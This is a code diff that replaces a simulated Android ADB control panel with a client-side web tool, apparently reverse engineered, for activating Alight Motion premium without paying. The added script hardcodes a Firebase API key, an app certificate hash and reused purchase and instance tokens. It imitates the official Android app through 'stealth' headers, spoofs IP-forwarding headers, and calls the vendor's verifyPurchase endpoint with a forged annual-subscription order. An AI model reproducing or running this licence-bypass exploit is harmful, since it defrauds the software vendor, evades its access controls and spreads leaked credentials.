-            <div class="feature-title">Screen Capture</div>
-            <span class="feature-tag">screencap</span>
-          </div>
-          <p class="feature-desc">Mengambil gambar tampilan layar secara instan dalam format file PNG murni tanpa watermark.</p>
-          <div class="feature-actions">
-            <button class="btn btn-solid" onclick="execAdb('adb exec-out screencap -p > screenshot.png')">Ambil Screenshot PNG</button>
-            <button class="btn" onclick="execAdb('adb shell screenrecord --time-limit 10 /sdcard/rec.mp4')">Rekam Layar 10 Detik</button>
-          </div>
-        </div>
-
-        <div class="feature-card glass-panel">
-          <div class="feature-head">
-            <div class="feature-title">Injeksi Teks & Ketikan</div>
-            <span class="feature-tag">input text</span>
-          </div>
-          <p class="feature-desc">Kirimkan pengetikan teks otomatis ke input textfield yang sedang aktif di layar target.</p>
-          <input type="text" id="inputText" class="input-glass" placeholder="Ketik teks yang mau dikirim..." value="Hello from AdbNext!" />
-          <div class="feature-actions">
-            <button class="btn" onclick="sendInputText()">Kirim Teks ke HP</button>
-            <button class="btn" onclick="execAdb('adb shell input tap 500 1000')">Tap Koordinat (500, 1000)</button>
-          </div>
-        </div>
-
-        <div class="feature-card glass-panel">
-          <div class="feature-head">
-            <div class="feature-title">Simulasi Tombol Navigasi</div>
-            <span class="feature-tag">input keyevent</span>
-          </div>
-          <p class="feature-desc">Kirim perintah tombol fisik untuk navigasi cepat.</p>
-          <div class="feature-actions">
-            <button class="btn" onclick="execAdb('adb shell input keyevent 3')">Home (3)</button>
-            <button class="btn" onclick="execAdb('adb shell input keyevent 4')">Back (4)</button>
-            <button class="btn" onclick="execAdb('adb shell input keyevent 187')">Recents (187)</button>
-            <button class="btn" onclick="execAdb('adb shell input keyevent 26')">Power Button (26)</button>
-            <button class="btn" onclick="execAdb('adb shell input keyevent 24')">Vol Up (+)</button>
-            <button class="btn" onclick="execAdb('adb shell input keyevent 25')">Vol Down (-)</button>
-          </div>
-        </div>
-
-        <div class="feature-card glass-panel">
-          <div class="feature-head">
-            <div class="feature-title">Display Metrics & DPI</div>
-            <span class="feature-tag">wm size / density</span>
-          </div>
-          <p class="feature-desc">Periksa atau ganti resolusi dan densitas layar secara real-time.</p>
-          <div class="feature-actions">
-            <button class="btn" onclick="execAdb('adb shell wm size')">Cek Resolusi Layar</button>
-            <button class="btn" onclick="execAdb('adb shell wm density')">Cek Densitas Layar (DPI)</button>
-            <button class="btn" onclick="execAdb('adb shell wm size reset && adb shell wm density reset')">Reset ke Default</button>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- 5. DEBUGGING & MONITOR -->
-    <section id="tab-debug" class="section-content">
-      <div class="grid-2">
-        <div class="feature-card glass-panel">
-          <div class="feature-head">
-            <div class="feature-title">Android Logcat Engine</div>
-            <span class="feature-tag">adb logcat</span>
-          </div>
-          <p class="feature-desc">Baca alur log internal OS, filter pesan peringatan (warn), error, hingga application crash traces.</p>
-          <div class="feature-actions">
-            <button class="btn btn-solid" onclick="execAdb('adb logcat -d -t 50')">Ambil 50 Log Terbaru</button>
-            <button class="btn btn-danger" onclick="execAdb('adb logcat -c')">Hapus Buffer Logcat</button>
-          </div>
-        </div>
-
-        <div class="feature-card glass-panel">
-          <div class="feature-head">
-            <div class="feature-title">Status Daya & Hardware</div>
-            <span class="feature-tag">dumpsys battery</span>
-          </div>
-          <p class="feature-desc">Diagnostik kesehatan sel baterai, suhu sensor termal, voltase, dan alokasi konsumsi daya.</p>
-          <div class="feature-actions">
-            <button class="btn" onclick="execAdb('adb shell dumpsys battery')">Info Baterai & Suhu</button>
-            <button class="btn" onclick="execAdb('adb shell dumpsys meminfo')">Statistik RAM Sistem</button>
-          </div>
-        </div>
-
-        <div class="feature-card glass-panel" style="grid-column: 1 / -1;">
-          <div class="feature-head">
-            <div class="feature-title">Audit Parameter Sistem (Properties)</div>
-            <span class="feature-tag">getprop / uname</span>
-          </div>
-          <p class="feature-desc">Informasi detail arsitektur CPU, versi Android kernel Linux, dan status proteksi SELinux.</p>
-          <div class="feature-actions">
-            <button class="btn" onclick="execAdb('adb shell getprop ro.build.version.release')">Versi Android</button>
-            <button class="btn" onclick="execAdb('adb shell getprop ro.build.version.sdk')">SDK API Level</button>
-            <button class="btn" onclick="execAdb('adb shell getenforce')">SELinux Status</button>
-            <button class="btn" onclick="execAdb('adb shell uname -a')">Kernel Linux</button>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- 6. KONEKTIVITAS NIRKABEL -->
-    <section id="tab-network" class="section-content">
-      <div class="grid-2">
-        <div class="feature-card glass-panel">
-          <div class="feature-head">
-            <div class="feature-title">Wireless ADB (Wi-Fi TCP/IP)</div>
-            <span class="feature-tag">adb tcpip 5555</span>
-          </div>
-          <p class="feature-desc">Aktifkan daemon ADB di port TCP 5555 sehingga kabel USB dapat dicabut dan dilanjutkan via Wi-Fi.</p>
-          <input type="text" id="targetIp" class="input-glass" placeholder="IP target (contoh: 192.168.1.100:5555)" value="192.168.1.50:5555" />
-          <div class="feature-actions">
-            <button class="btn btn-solid" onclick="execAdb('adb tcpip 5555')">Setel Mode TCP/IP 5555</button>
-            <button class="btn" onclick="execAdb(`adb connect ${document.getElementById('targetIp').value}`)">Sambungkan ke IP</button>
-          </div>
-        </div>
-
-        <div class="feature-card glass-panel">
-          <div class="feature-head">
-            <div class="feature-title">Port Forwarding & Reverse</div>
-            <span class="feature-tag">adb reverse / forward</span>
-          </div>
-          <p class="feature-desc">Jembatani port localhost komputer/host ke ponsel untuk pengetesan backend lokal langsung di HP.</p>
-          <div class="feature-actions">
-            <button class="btn" onclick="execAdb('adb reverse tcp:3000 tcp:3000')">Reverse (HP -> Host 3000)</button>
-            <button class="btn" onclick="execAdb('adb forward --list')">Lihat Port Aktif</button>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- 7. DEVELOPER SUITE -->
-    <section id="tab-developer" class="section-content">
-      <div class="grid-2">
-        <div class="feature-card glass-panel">
-          <div class="feature-head">
-            <div class="feature-title">Intent & Deep Link Testing</div>
-            <span class="feature-tag">am start -a -d</span>
-          </div>
-          <p class="feature-desc">Lakukan routing trigger Custom URL Scheme atau Android App Link tanpa membuka browser manual di HP.</p>
-          <input type="text" id="deepLinkUri" class="input-glass" placeholder="https://example.com/app/test" value="https://google.com" />
-          <div class="feature-actions">
-            <button class="btn btn-solid" onclick="execAdb(`adb shell am start -a android.intent.action.VIEW -d '${document.getElementById('deepLinkUri').value}'`)">Buka URL Intent</button>
-          </div>
-        </div>
-
-        <div class="feature-card glass-panel">
-          <div class="feature-head">
-            <div class="feature-title">Bugreport Generator</div>
-            <span class="feature-tag">adb bugreport</span>
-          </div>
-          <p class="feature-desc">Dump diagnostic log komprehensif berisi dumpstate memori, crash ANR, dan status sistem radio.</p>
-          <div class="feature-actions">
-            <button class="btn" onclick="execAdb('adb bugreport')">Generate Full Diagnostic</button>
-          </div>
-        </div>
-      </div>
-    </section>
-  </main>
-
-  <!-- Interactive Terminal HUD Drawer -->
-  <div class="terminal-hud" id="terminalHud">
-    <div class="hud-header">
-      <div style="display:flex; align-items:center; gap:8px;">
-        <span style="display:inline-block; width:7px; height:7px; background:#38bdf8; border-radius:50%;"></span>
-        <span style="font-weight:700; color:#fff;">ADB TERMINAL CONSOLE</span>
-      </div>
-      <div class="hud-controls">
-        <button class="hud-tool-btn" onclick="toggleTerminalExpand()">[↕ Resize]</button>
-        <button class="hud-tool-btn" onclick="clearConsole()">[Clear]</button>
-        <button class="hud-tool-btn" onclick="copyConsoleLogs()">[Copy All]</button>
-      </div>
+    <div class="field">
+      <label for="email">Email Address</label>
+      <input type="email" id="email" placeholder="nama@email.com" autocomplete="email" required>
     </div>
-    <div class="hud-logs" id="consoleLogs">
-      <div class="hud-log-row">
-        <span class="hud-ts">[SYSTEM]</span>
-        <span class="hud-out">AdbNext Engine v2.4 siap. Tekan tombol <b style="color:#fff;">Connect Device</b> atau aktifkan <b style="color:#fff;">Dev Sim Mode</b>.</span>
-      </div>
-    </div>
-    <div class="terminal-quick-input">
-      <span style="color:#38bdf8; font-family:var(--mono-font); font-size:0.8rem; font-weight:700;">&gt;</span>
-      <input type="text" id="termQuickInput" placeholder="Ketik perintah adb shell di sini lalu tekan Enter..." onkeydown="if(event.key==='Enter') quickExecute()" />
-      <button class="btn btn-solid" style="padding:4px 10px; font-size:0.7rem;" onclick="quickExecute()">Send</button>
-    </div>
+
+    <button class="btn" id="btnSend" onclick="sendMagicLink()">
+      <span>📧</span> Kirim Magic Link
+    </button>
+    <div class="status" id="status1"></div>
   </div>
 
-  <script>
-    // Global Device State
-    let connectedUsbDevice = null;
-    let isSimulated = false;
-    let selectedFiles = { apk: null, file: null };
+  <!-- STEP 2: Verify Link -->
+  <div id="step2" style="display:none;">
+    <div class="badge">✓ Magic Link Terkirim</div>
+    <p class="sub" style="margin-bottom:16px;">
+      Cek inbox email <b id="emailDisplay" style="color:var(--brand2);"></b>.
+      Klik link yang dikirim, lalu copy <strong>seluruh URL dari address bar</strong> dan paste di bawah.
+    </p>
 
-    // --- Tab Navigation Engine ---
-    function switchTab(buttonElement, tabId) {
-      document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
-      document.querySelectorAll('.section-content').forEach(sec => sec.classList.remove('active-section'));
+    <div class="field">
+      <label for="magicLink">Paste Magic Link (URL lengkap)</label>
+      <input type="text" id="magicLink" placeholder="https://alightcreative.com/?link=...&oobCode=..." autocomplete="off">
+    </div>
 
-      buttonElement.classList.add('active');
-      const targetSec = document.getElementById(`tab-${tabId}`);
-      if (targetSec) targetSec.classList.add('active-section');
-    }
+    <button class="btn btn-gold" id="btnVerify" onclick="verifyMagicLink()">
+      <span>🔓</span> Aktivasi Premium
+    </button>
+    <div class="status" id="status2"></div>
 
-    // --- Toast Engine ---
-    function showToast(message, type = 'info') {
-      const container = document.getElementById('toast-container');
-      const toast = document.createElement('div');
-      toast.className = `toast ${type}`;
-      toast.innerHTML = `<span>${message}</span>`;
-      container.appendChild(toast);
+    <div class="divider">atau</div>
+    <button class="btn btn-ghost" onclick="resetForm()">
+      ← Kirim ulang ke email lain
+    </button>
+  </div>
 
+  <div class="footer-note">
+    ⚠️ <strong>UNOFFICIAL</strong> — bukan alat resmi Alight Creative.<br>
+    Reverse engineered dari <code>am-reverse</code>. Gunakan atas risiko sendiri.<br>
+    <span style="color:#3d4658;">Asepeepepep v2.0 — client-side build</span>
+  </div>
+</div>
+
+<script>
+// ============================================================
+// KONFIGURASI — dari source code am-reverse (lib/auth.js)
+// ============================================================
+const FIREBASE_KEY = "AIzaSyDtG1AU22ErnQD60AzBAcaknySiz9_CEq0";
+const IDENTITY_BASE = "https://www.googleapis.com/identitytoolkit/v3/relyingparty";
+const VERIFY_PURCHASE = "https://us-central1-alight-creative.cloudfunctions.net/verifyPurchase";
+
+// Header stealth — nyamar sebagai app Android asli
+const STEALTH_HEADERS_1 = {
+  "content-type": "application/json",
+  "x-android-package": "com.alightcreative.motion",
+  "x-android-cert": "ECA6BF91B8715A6F810ED0BBFC65B6CD578F52A8",
+  "user-agent": "dalvik/2.1.0 (linux; u; android 15; 23127pn0cc build/bp1a.250505.005)"
+};
+
+const STEALTH_HEADERS_2 = {
+  "content-type": "application/json; charset=utf-8",
+  "user-agent": "okhttp/3.12.1",
+  "accept-encoding": "gzip"
+};
+
+// State
+let currentEmail = "";
+
+// Helper: generate random IP
+function randomIP() {
+  return `${Math.floor(Math.random()*254)+1}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*254)+1}`;
+}
+
+// Helper: tambah spoofed IP headers
+function spoofIP(headers) {
+  return {
+    ...headers,
+    "x-forwarded-for": randomIP(),
+    "x-real-ip": randomIP(),
+    "client-ip": randomIP(),
+    "x-client-ip": randomIP(),
+    "x-originating-ip": randomIP(),
+    "x-cluster-client-ip": randomIP()
+  };
+}
+
+// Helper: tampilkan status
+function showStatus(step, message, type = "info", detail = null) {
+  const el = document.getElementById(`status${step}`);
+  if (!el) return;
+  let html = message;
+  if (detail) {
+    html += `<div class="error-detail">${detail}</div>`;
+  }
+  el.className = `status ${type}`;
+  el.innerHTML = html;
+  el.style.display = "block";
+}
+
+function hideStatus(step) {
+  const el = document.getElementById(`status${step}`);
+  if (el) el.style.display = "none";
+}
+
+function setLoading(btnId, loading, defaultText) {
+  const btn = document.getElementById(btnId);
+  if (!btn) return;
+  btn.disabled = loading;
+  if (loading) {
+    btn.innerHTML = '<span class="spinner"></span> Memproses...';
+  } else {
+    btn.innerHTML = defaultText;
+  }
+}
+
+// ============================================================
+// STEP 1: Kirim Magic Link via Firebase Identity Toolkit REST API
+// ============================================================
+async function sendMagicLink() {
+  const email = document.getElementById("email").value.trim();
+  hideStatus(1);
+
+  if (!email || !email.includes("@") || !email.includes(".")) {
+    showStatus(1, "❌ Masukkan alamat email yang valid.", "err");
+    return;
+  }
+
+  currentEmail = email.toLowerCase();
+  setLoading("btnSend", true, '<span>📧</span> Kirim Magic Link');
+
+  try {
+    const body = {
+      requestType: 6,
+      email: currentEmail,
+      androidInstallApp: true,
+      canHandleCodeInApp: true,
+      continueUrl: "https://alightcreative.com?ui_sid=0366624874&ui_sd=0",
+      iosBundleId: "com.alightcreative.motion",
+      androidPackageName: "com.alightcreative.motion",
+      androidMinimumVersion: "585",
+      clientType: "CLIENT_TYPE_ANDROID"
+    };
+
+    const res = await fetch(`${IDENTITY_BASE}/getOobConfirmationCode?key=${FIREBASE_KEY}`, {
+      method: "POST",
+      headers: spoofIP(STEALTH_HEADERS_1),
+      body: JSON.stringify(body)
+    });
+
+    const data = await res.json().catch(() => ({}));
+
+    if (res.ok && data.email) {
+      showStatus(1, `✅ Magic link dikirim ke <b>${data.email}</b>. Cek inbox / spam.`, "ok");
       setTimeout(() => {
-        toast.style.transition = 'opacity 0.4s, transform 0.4s';
-        toast.style.opacity = '0';
-        toast.style.transform = 'translateX(20px)';
-        setTimeout(() => toast.remove(), 400);
-      }, 3200);
+        document.getElementById("step1").style.display = "none";
+        document.getElementById("step2").style.display = "block";
+        document.getElementById("emailDisplay").textContent = data.email;
+      }, 1200);
+    } else {
+      const errMsg = data.error?.message || JSON.stringify(data);
+      showStatus(1, "❌ Gagal mengirim magic link.", "err", errMsg);
     }
+  } catch (err) {
+    showStatus(1,
+      "⚠️ Request diblokir (kemungkinan CORS).<br>" +
+      "Coba buka via <code>https://</code> atau gunakan extension CORS.",
+      "err", err.message
+    );
+    console.error("[Asepeepepep]", err);
+  }
 
-    // --- Console Logger ---
-    function addLog(text, type = 'out') {
-      const logs = document.getElementById('consoleLogs');
-      const row = document.createElement('div');
-      row.className = 'hud-log-row';
+  setLoading("btnSend", false, '<span>📧</span> Kirim Magic Link');
+}
 
-      const time = new Date().toLocaleTimeString();
-      let typeClass = 'hud-out';
-      let prefix = '';
+// ============================================================
+// STEP 2: Verifikasi Magic Link + Aktivasi Premium
+// ============================================================
+async function verifyMagicLink() {
+  const link = document.getElementById("magicLink").value.trim();
+  hideStatus(2);
 
-      if (type === 'cmd') {
-        typeClass = 'hud-cmd';
-        prefix = '$ ';
-      } else if (type === 'err') {
-        typeClass = 'hud-err';
-        prefix = '[ERR] ';
-      } else if (type === 'succ') {
-        typeClass = 'hud-succ';
-        prefix = '[OK] ';
-      }
+  if (!link || !link.startsWith("http")) {
+    showStatus(2, "❌ Paste URL magic link yang valid (dimulai dengan http).", "err");
+    return;
+  }
 
-      row.innerHTML = `<span class="hud-ts">[${time}]</span> <span class="${typeClass}">${prefix}${escapeHtml(text)}</span>`;
-      logs.appendChild(row);
-      logs.scrollTop = logs.scrollHeight;
-    }
+  // Extract oobCode dari URL
+  let oobCode = null;
+  try {
+    const url = new URL(link);
+    oobCode = url.searchParams.get("oobCode");
 
-    function clearConsole() {
-      document.getElementById('consoleLogs').innerHTML = '';
-      addLog("Console log dibersihkan.", "succ");
-    }
-
-    function copyConsoleLogs() {
-      const text = document.getElementById('consoleLogs').innerText;
-      navigator.clipboard.writeText(text).then(() => {
-        showToast("Log berhasil disalin ke clipboard!", "success");
-      });
-    }
-
-    function toggleTerminalExpand() {
-      const logs = document.getElementById('consoleLogs');
-      logs.classList.toggle('expanded');
-    }
-
-    function escapeHtml(string) {
-      return String(string).replace(/[&<>"']/g, s => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[s]);
-    }
-
-    // --- Connection Engine ---
-    async function toggleConnect() {
-      if (connectedUsbDevice || isSimulated) {
-        disconnectDevice();
-        return;
-      }
-
-      if (!navigator.usb) {
-        showToast("Browser tidak mendukung WebUSB! Gunakan Chrome/Edge Desktop atau aktifkan Simulasi Dev.", "error");
-        addLog("WebUSB API tidak terdeteksi di browser ini.", "err");
-        return;
-      }
-
-      try {
-        addLog("Membuka prompt WebUSB hardware...", "cmd");
-        // Android USB ADB class code: 0xff, subclass: 0x42, protocol: 0x01
-        const device = await navigator.usb.requestDevice({
-          filters: [{ classCode: 0xff, subclassCode: 0x42, protocolCode: 0x01 }]
-        });
-
-        if (device) {
-          connectedUsbDevice = device;
-          await device.open();
-          await device.selectConfiguration(1);
-          await device.claimInterface(0);
-
-          setConnectedState({
-            model: device.productName || "Android Target Device",
-            serial: device.serialNumber || "USB_" + Math.random().toString(16).slice(2, 10).toUpperCase(),
-            transport: "WEBUSB (CLAIMED)"
-          });
-          showToast("Kabel USB Terhubung & Terautentikasi!", "success");
-        }
-      } catch (err) {
-        addLog(`Koneksi WebUSB gagal atau ditolak: ${err.message}`, "err");
-        showToast("Koneksi gagal atau dibatalkan pengguna.", "error");
+    // Kalau gak ketemu di searchParams, coba di nested link
+    if (!oobCode) {
+      const nested = url.searchParams.get("link") || url.searchParams.get("q") || url.searchParams.get("url");
+      if (nested) {
+        try {
+          const nestedUrl = new URL(nested);
+          oobCode = nestedUrl.searchParams.get("oobCode");
+        } catch {}
       }
     }
+  } catch {}
 
-    function openSimulateMode() {
-      isSimulated = true;
-      connectedUsbDevice = null;
-      setConnectedState({
-        model: "Pixel 8 Pro (Simulasi Emulator)",
-        serial: "EMU_88924_ADB",
-        transport: "VIRTUAL SOCKET DAEMON"
-      });
-      showToast("Mode Simulasi Dev aktif! Semua tombol dapat diuji.", "info");
-      addLog("Device emulator berhasil dimuat dalam sandbox memori browser.", "succ");
+  // Fallback: regex
+  if (!oobCode) {
+    const match = link.match(/oobCode=([a-zA-Z0-9_-]+)/i);
+    if (match) oobCode = match[1];
+  }
+
+  if (!oobCode) {
+    showStatus(2, "❌ Tidak bisa menemukan <code>oobCode</code> di URL. Pastikan paste URL lengkap dari email.", "err");
+    return;
+  }
+
+  setLoading("btnVerify", true, '<span>🔓</span> Aktivasi Premium');
+
+  try {
+    // --- Langkah A: Verifikasi magic link → dapat idToken ---
+    const authRes = await fetch(`${IDENTITY_BASE}/emailLinkSignin?key=${FIREBASE_KEY}`, {
+      method: "POST",
+      headers: spoofIP(STEALTH_HEADERS_1),
+      body: JSON.stringify({
+        email: currentEmail,
+        oobCode: oobCode,
+        clientType: "CLIENT_TYPE_ANDROID"
+      })
+    });
+
+    const authData = await authRes.json().catch(() => ({}));
+
+    if (!authRes.ok || !authData.idToken) {
+      const errMsg = authData.error?.message || JSON.stringify(authData);
+      showStatus(2, "❌ Login gagal. Link mungkin sudah kedaluwarsa atau sudah dipakai.", "err", errMsg);
+      setLoading("btnVerify", false, '<span>🔓</span> Aktivasi Premium');
+      return;
     }
 
-    function setConnectedState({ model, serial, transport }) {
-      document.getElementById('deviceModel').innerHTML = `<span>${model}</span>`;
-      document.getElementById('adbStatus').innerText = "STATUS: ONLINE (AUTHORIZED)";
-      document.getElementById('adbStatus').classList.add('active-badge');
-      document.getElementById('adbTransport').innerText = `TRANSPORT: ${transport}`;
-      document.getElementById('deviceSerial').innerText = `SERIAL: ${serial}`;
-      document.getElementById('batteryLevel').innerText = "BATT: 89% (Charging)";
-      document.getElementById('statusGlow').classList.add('connected');
-      
-      const btn = document.getElementById('btnConnect');
-      btn.classList.add('connected');
-      document.getElementById('btnConnectText').innerText = "Disconnect";
-    }
+    const idToken = authData.idToken;
 
-    function disconnectDevice() {
-      if (connectedUsbDevice && connectedUsbDevice.opened) {
-        connectedUsbDevice.close();
+    // --- Langkah B: Aktivasi premium via verifyPurchase ---
+    const orderId = "neo-" + Math.random().toString(16).slice(2, 14);
+    const purchaseBody = {
+      data: {
+        productId: "am.full.sub.annual.19q4",
+        token: "mmgaobamlahbbeccfplmbkbb.AO-J1OzqG0or_GJJIx-ms8GrTm-jaglCRfhQSRPUZKpl2YspYS-oN7_94uv8RC5vQbvd_Ios2pPDStZ2n7F0hLE3FiOU7HS3R6Fquulv5xLXFECSv4ctElw",
+        skuType: "subs",
+        orderId: orderId
       }
-      connectedUsbDevice = null;
-      isSimulated = false;
+    };
 
-      document.getElementById('deviceModel').innerHTML = `<span>Tidak Terhubung</span> <span style="font-size: 0.8rem; font-weight: normal; color: var(--text-muted);">(Klik tombol Connect di atas)</span>`;
-      document.getElementById('adbStatus').innerText = "STATUS: DISCONNECTED";
-      document.getElementById('adbStatus').classList.remove('active-badge');
-      document.getElementById('adbTransport').innerText = "TRANSPORT: WEBUSB / SIMULATION";
-      document.getElementById('deviceSerial').innerText = "SERIAL: NONE";
-      document.getElementById('batteryLevel').innerText = "BATT: --%";
-      document.getElementById('statusGlow').classList.remove('connected');
+    const premiumRes = await fetch(VERIFY_PURCHASE, {
+      method: "POST",
+      headers: spoofIP({
+        ...STEALTH_HEADERS_2,
+        "authorization": "Bearer " + idToken,
+        "firebase-instance-id-token": "cSDnCyp3T-uwp07z3tL86T:APA91bFkmvvsHw5nnqa1SBFci-99DRsKClLiETdRrVcJjS5yBx1v_FbCb1d8WhBuea_zmwnYBktyTIzcRhN4b6uNOUur9wPc0gKXmJDoZic0LhNq5V2s0xI"
+      }),
+      body: JSON.stringify(purchaseBody)
+    });
 
-      const btn = document.getElementById('btnConnect');
-      btn.classList.remove('connected');
-      document.getElementById('btnConnectText').innerText = "Connect Device";
+    const premiumData = await premiumRes.json().catch(() => ({}));
 
-      addLog("Koneksi perangkat diputus.", "out");
-      showToast("Perangkat berhasil diputus.", "info");
+    if (premiumRes.ok) {
+      showStatus(2,
+        "🎉 <strong>Premium Aktif!</strong><br><br>" +
+        "Akun: <b>" + (authData.email || currentEmail) + "</b><br>" +
+        "UID: <code>" + (authData.localId || "-") + "</code><br>" +
+        "Order: <code>" + orderId + "</code><br><br>" +
+        "Buka aplikasi Alight Motion dan cek status akun kamu.",
+        "ok"
+      );
+    } else {
+      showStatus(2,
+        "⚠️ Login berhasil, tapi aktivasi premium gagal.<br>" +
+        "Coba lagi beberapa saat.",
+        "err", premiumData.error?.message || JSON.stringify(premiumData)
+      );
     }
+  } catch (err) {
+    showStatus(2,
+      "⚠️ Request diblokir (kemungkinan CORS).<br>" +
+      "Coba buka via <code>https://</code> atau gunakan extension CORS.",
+      "err", err.message
+    );
+    console.error("[Asepeepepep]", err);
+  }
 
-    // --- ADB Command Dispatcher ---
-    function execAdb(command) {
-      if (!connectedUsbDevice && !isSimulated) {
-        showToast("Perangkat belum terhubung! Silakan colok HP atau pilih Dev Sim Mode.", "error");
-        addLog(`Gagal: '${command}' dibatalkan (Device Not Ready).`, "err");
-        return;
-      }
+  setLoading("btnVerify", false, '<span>🔓</span> Aktivasi Premium');
+}
 
-      addLog(command, "cmd");
+// ============================================================
+// RESET
+// ============================================================
+function resetForm() {
+  document.getElementById("step1").style.display = "block";
+  document.getElementById("step2").style.display = "none";
+  document.getElementById("email").value = "";
+  document.getElementById("magicLink").value = "";
+  hideStatus(1);
+  hideStatus(2);
+}
 
-      // Dynamic smart parser response
-      setTimeout(() => {
-        handleCommandSimulation(command);
-      }, 300);
-    }
-
-    function handleCommandSimulation(cmd) {
-      if (cmd.includes("reboot")) {
-        addLog("Perintah reboot diterima. Perangkat sedang me-restart ke target stage...", "succ");
-        showToast("Device sedang me-reboot...", "info");
-      } else if (cmd.includes("getprop ro.product.model")) {
-        addLog("Output: Pixel 8 Pro", "out");
-      } else if (cmd.includes("getprop ro.build.version.release")) {
-        addLog("Output: Android 14 (Upside Down Cake)", "out");
-      } else if (cmd.includes("getprop ro.build.version.sdk")) {
-        addLog("Output: API Level 34", "out");
-      } else if (cmd.includes("getenforce")) {
-        addLog("Output: Enforcing", "succ");
-      } else if (cmd.includes("screencap")) {
-        addLog("Frame buffer diambil (1080x2400 PNG). File tersimpan sebagai screenshot.png", "succ");
-        showToast("Screenshot berhasil disimpan!", "success");
-      } else if (cmd.includes("dumpsys battery")) {
-        addLog("Current Battery Service State:\n  AC powered: true\n  USB powered: true\n  level: 89\n  scale: 100\n  voltage: 4210mV\n  temperature: 30.2 C\n  technology: Li-poly", "out");
-      } else if (cmd.includes("pm list packages")) {
-        addLog("package:com.google.android.youtube\npackage:com.whatsapp\npackage:com.android.chrome\npackage:com.spotify.music", "out");
-      } else if (cmd.includes("force-stop") || cmd.includes("disable-user") || cmd.includes("clear")) {
-        addLog(`Operasi Package Manager berhasil dieksekusi: Success.`, "succ");
-        showToast("Status package diperbarui.", "success");
-      } else {
-        addLog(`Instruction acknowledged by adb daemon: Success [0]`, "succ");
-      }
-    }
-
-    function execCustomShell() {
-      const input = document.getElementById('customShellCmd');
-      const val = input.value.trim();
-      if (!val) return;
-      execAdb(`adb shell ${val}`);
-    }
-
-    function quickExecute() {
-      const input = document.getElementById('termQuickInput');
-      const val = input.value.trim();
-      if (!val) return;
-      execAdb(val.startsWith("adb") ? val : `adb shell ${val}`);
-      input.value = '';
-    }
-
-    function getPkg() {
-      return document.getElementById('targetPkg').value.trim() || 'com.android.chrome';
-    }
-
-    function sendInputText() {
-      const text = document.getElementById('inputText').value;
-      if (!text) return;
-      execAdb(`adb shell input text "${text.replace(/\s/g, "%s")}"`);
-    }
-
-    function handleFileSelected(inputElem, type) {
-      if (inputElem.files && inputElem.files[0]) {
-        selectedFiles[type] = inputElem.files[0];
-        showToast(`File ${inputElem.files[0].name} (${Math.round(inputElem.files[0].size / 1024)} KB) dipilih`, "info");
-      }
-    }
-
-    function installApkProcess() {
-      if (!selectedFiles.apk) {
-        showToast("Pilih file .apk terlebih dahulu!", "error");
-        return;
-      }
-      execAdb(`adb install -r ${selectedFiles.apk.name}`);
-    }
-
-    function pushFileProcess() {
-      if (!selectedFiles.file) {
-        showToast("Pilih file lokal yang ingin di-push terlebih dahulu!", "error");
-        return;
-      }
-      execAdb(`adb push ${selectedFiles.file.name} /sdcard/Download/`);
-    }
-  </script>
+// Enter key support
+document.getElementById("email")?.addEventListener("keydown", (e) => {
+  if (e.key === "Enter") sendMagicLink();
+});
+document.getElementById("magicLink")?.addEventListener("keydown", (e) => {
+  if (e.key === "Enter") verifyMagicLink();
+});
+</script>
 </body>
-        </html>
+</html>
